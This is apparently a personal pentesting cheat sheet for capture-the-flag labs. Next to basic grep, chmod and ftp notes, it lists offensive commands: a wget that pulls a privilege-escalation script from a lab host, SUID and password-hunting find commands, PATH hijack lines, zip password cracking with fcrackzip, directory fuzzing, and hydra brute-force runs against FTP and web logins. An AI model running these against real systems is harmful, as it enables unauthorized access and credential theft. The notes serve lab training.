# LINUX BASIC

### basics
###### note:- use man or -h/--help for more
##### grep

```
grep l.rts 

gonna match use . as all char and gonna all letters contain l rts.

===========================================

grep ^fruit

gonna match start from beginngin


============================================

grep fruit$

gonna match start from end.

=============================================

grep -i word

gonna match upper and lower both
otherwise only lower if word in lower. means case sesitive.
```

##### chmod

```
    The first argument you give to the “chmod” command is ‘u’, ‘g’, ‘o’. We use:
    u for user
    g for group
    o for others,
    you can also use a combination of them (u,g,o).
    This specifies which of the three groups you want to modify.
    After this use
    a ‘+’ for adding
    a ‘-‘ for removing
    and a “=” for assigning a permission.
    Then specify the permission r,w or x you want to change.
    Here also you can use a combination of r,w,x.
    This specifies which of the three permissions “rwx” you want to modify
    use can use commas to modify more permissions
    Finally, the name of the file whose permission you are changing
```

##### wget

```
wget http://10.10.14.63/peas.bat -o C:\users\administrator\desktop\peas.bat
#-o for where we want to save and file name.
```

##### find

```
find / -perm +6000 2>/dev/null | grep '/bin/'

To find the root process

 find / -type f -user www-data

find / -user root -perm -4000 -print 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

find / -type f -user www-data | cat * | grep "password"

find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null


here use pass , passwd , password in grep

find / -readable 
readable by current user

find / -user bandit7 -group bandit6 -size 33c

find / -user bandit7 -group bandit6 -size 33c -type f -ls
```

##### dig

```
dig 10.10.10.10
dig @10.13.37.10 -x 10.13.37.10
```

##### env related

```
export PATH=/tmp/:$PATH
PYTHONPATH=/tmp/fake
```
##### fcrackzip

```
    -b: for using brute force algorithms.
    -D: for using a dictionary.
    -B: execute a small benchmark.
    -c: use characters from charset.
    -h: show the help message.
    –version: show the version of this program.
    -V: validate or check the algorithm.
    -v: for verbose mode.
    -p: for using a string as a password.
    -l: for providing a specific length to password.
    -u: for weed out wrong passwords.
    -m: to specify the method number.


fcrackzip -b -c 'a' -u file.zip
	
fcrackzip -b -v -c 'a' -u file.zip

dic attack :-

fcrackzip -D -p rockyou.txt file.zip

fcrackzip -b -v -c 'a' -m 1 -u file.zip

fcrackzip -b -v -D -p /usr/share/wordlists/rockyou.txt -m 1 -u 6969.zip
```

##### ftp

```
1. Before downloading a file, we should set the local FTP file download directory by using 'lcd' command:

lcd /home/user/yourdirectoryname

2. ftp 10.10.10.197 21

3.Now, we can use the command 'get' command to download a file, the usage is:

get file


4. To download several files we can use wildcards. In this example, I will download all files with the .xls file extension.

mget *.xls

5. We can upload files that are in the local directory where we made the FTP connection. To upload a file, we can use 'put' command.

put file

6. When the file that you want to upload is not in the local directory, you can use the absolute path starting with "/" as well:

put /path/file

7. To upload several files we can use the mput command similar to the mget example from above:

mput *.xls

** https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/

**https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
```

##### fuzz

```
wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 100

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://player2.htb/FUZZ --hc 404,403 -t 100

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100
=================================================================================================================================
 wfuzz -c -u 'http://10.10.10.203' -H 'Host: FUZZ.worker.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hl 3 --hc 400
 
 -hl for line.
 --hc/hl/hw/hh N[,N]+        : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --sc/sl/sw/sh N[,N]+        : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --ss/hs regex           : Show/hide responses with the specified regex within the content
    --filter <filter>       : Show/hide responses using the specified filter expression (Use BBB for taking values from baseline)
    --prefilter <filter>        : Filter items before fuzzing using the specified expression.
=========================================================================================================================
sudo dirsearch -u http://fabricorp.local -e *

==================================================================================================================================


gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q

dns:-
gobuster dns -d mysite.com -t 50 -w common-names.txt


ip:-
gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i

more
https://github.com/OJ/gobuster
================================================================================================================================

```

##### hydra

```
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp


https://github.com/frizb/Hydra-Cheatsheet



hydra -L ./user.txt -P ./pass.txt product.player2.htb http-post-form "/:username=^USER^&password=^PASS^&Submit=Sign+in:alert


hydra -C userpass.txt product.player2.htb http-post-form "/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
use user:pass creds

hydra -l 'pain' -P /usr/share/wordlists/rockyou.txt backup.forwardslash.htb http-post-form "/login.php:username=^USER^&password=^PASS^&sign+in:The password you entered was not valid."
```

##### 